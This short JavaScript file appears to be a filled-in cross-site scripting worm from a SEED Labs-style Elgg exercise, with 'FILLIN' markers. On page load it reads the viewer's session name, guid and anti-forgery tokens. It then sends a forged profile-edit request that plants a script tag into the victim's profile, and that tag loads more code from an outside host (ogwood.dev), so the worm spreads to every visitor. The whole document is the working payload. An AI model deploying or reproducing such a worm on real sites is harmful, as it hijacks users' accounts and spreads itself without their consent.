 window.onload=function(){
 //JavaScriptcodetoaccessusername,userguid,TimeStamp__elgg_ts
 //andSecurityToken__elgg_token
 var userName="&name="+elgg.session.user.name;
 var guid="&guid="+elgg.session.user.guid;
 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 var token="&__elgg_token="+elgg.security.token.__elgg_token;
 //Constructthecontentofyoururl.
 var js="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
 var content=userName + guid + ts + token + "&briefdescription=" + js;
 var samyGuid=59; //FILLIN
 var sendurl="http://www.seed-server.com/action/profile/edit"; //FILLIN
 if(elgg.session.user.guid!=samyGuid)
 {
 //CreateandsendAjaxrequesttomodifyprofile
 var Ajax=null;
 Ajax=new XMLHttpRequest();
 Ajax.open("POST",sendurl,true);
 Ajax.setRequestHeader("Content-Type",
 "application/x-www-form-urlencoded");
 Ajax.send(content);
 }
 }
